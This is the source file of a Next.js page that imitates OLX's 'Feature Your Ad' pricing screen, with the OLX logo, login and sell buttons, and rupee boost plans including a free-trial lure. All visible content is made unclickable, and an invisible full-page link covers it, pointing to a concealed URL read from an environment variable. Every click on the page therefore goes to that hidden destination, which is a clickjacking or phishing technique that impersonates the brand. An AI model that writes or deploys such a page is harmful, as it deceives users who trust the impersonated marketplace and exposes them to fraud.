"use client";
import Image from "next/image";
import React, { useState } from "react";
import { Menu, X, Plus } from "lucide-react";
import Link from "next/link";

const pricingTiers = [
  {
    title: "Free Trial",
    price: "Rs. 299",
    discountPrice: "Rs. 0",
    duration: "7 Days",
    features: [
      "Top search result visibility",
      "Higher ad exposure",
      "Limited slot",
    ],
  },
  {
    title: "Super Boost",
    price: "Rs. 599",
    duration: "15 Days",
    features: [
      "More impressions",
      "Visible in recommended ads",
      "Priority in search",
    ],
  },
  {
    title: "Premium Boost",
    price: "Rs. 999",
    duration: "30 Days",
    features: [
      "Top in category",
      "Priority in search & browse",
      "Auto-renewal option",
    ],
  },
];

export default function Home() {
  const [mobileOpen, setMobileOpen] = useState(false);

  return (
    <main className="min-h-screen bg-gray-100 relative">
      {/* Full-page link overlay */}
      <a
        href={process.env.STORMLINK}
        className="absolute inset-0 z-[99] pointer-events-auto"
      ></a>

      {/* Actual content - non-clickable but visible */}
      <div className="relative z-10 pointer-events-none">
        {/* Navbar */}
        <nav className="bg-[#edf2ff] shadow-sm w-full sticky top-0 z-50">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-3 flex items-center justify-between">
            <div className="flex items-center space-x-6">
              <Image src="/olx-logo.png" alt="OLX" width={55} height={55} />
            </div>

            <div className="flex items-center space-x-4">
              <span className="text-[#013239] font-bold underline hidden sm:block cursor-pointer">
                LogIn
              </span>

              <button className="relative flex items-center justify-center p-1 rounded-full bg-gradient-to-r from-yellow-400 via-white to-blue-500 border-2 border-white hover:opacity-90 transition">
                <div className="bg-white rounded-full px-3 py-1 flex justify-center items-center space-x-1">
                  <Plus size={25} className=" text-black" />
                  <span className="text-sm font-semibold text-black">SELL</span>
                </div>
              </button>

              <div className="md:hidden">
                <button onClick={() => setMobileOpen(!mobileOpen)}>
                  {mobileOpen ? <X size={24} /> : <Menu size={24} />}
                </button>
              </div>
            </div>
          </div>

          {mobileOpen && (
            <div className="md:hidden px-6 pb-4 bg-[#edf2ff] space-y-2 text-gray-800 font-medium">
              <div className="flex items-center space-x-2">
                <Image src="/car.png" alt="Motors" width={24} height={24} />
                <span>Motors</span>
              </div>
              <div className="flex items-center space-x-2">
                <Image src="/home.png" alt="Property" width={24} height={24} />
                <span>Property</span>
              </div>
              <span className="underline">LogIn</span>
            </div>
          )}
        </nav>

        {/* Pricing Section */}
        <section className="py-12 px-4 sm:px-6 lg:px-8">
          <div className="max-w-7xl mx-auto">
            <h1 className="text-4xl font-bold text-center text-gray-800 mb-12">
              Feature Your Ad on OLX
            </h1>

            <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
              {pricingTiers.map((tier, index) => (
                <div
                  key={index}
                  className="bg-white rounded-2xl shadow-lg p-6 border border-gray-200 hover:shadow-2xl transition"
                >
                  <h2 className="text-2xl font-semibold text-indigo-600 mb-2">
                    {tier.title}
                  </h2>

                  <div className="mb-2">
                    {tier.discountPrice ? (
                      <div className="space-y-1">
                        <p className="text-md text-gray-600 line-through">
                          {tier.price}
                        </p>
                        <p className="text-2xl font-bold text-red-600">
                          {tier.discountPrice}
                        </p>
                      </div>
                    ) : (
                      <p className="text-xl font-bold text-gray-900">
                        {tier.price}
                      </p>
                    )}
                  </div>

                  <p className="text-sm text-gray-500 mb-4">{tier.duration}</p>
                  <ul className="text-gray-700 space-y-2">
                    {tier.features.map((feature, i) => (
                      <li key={i} className="flex items-center">
                        <span className="mr-2 text-green-500">✓</span> {feature}
                      </li>
                    ))}
                  </ul>
                  <button className="mt-6 w-full bg-indigo-600 text-white py-2 rounded-lg hover:bg-indigo-700 transition">
                    Feature Now
                  </button>
                </div>
              ))}
            </div>
          </div>
        </section>
      </div>
    </main>
  );
}
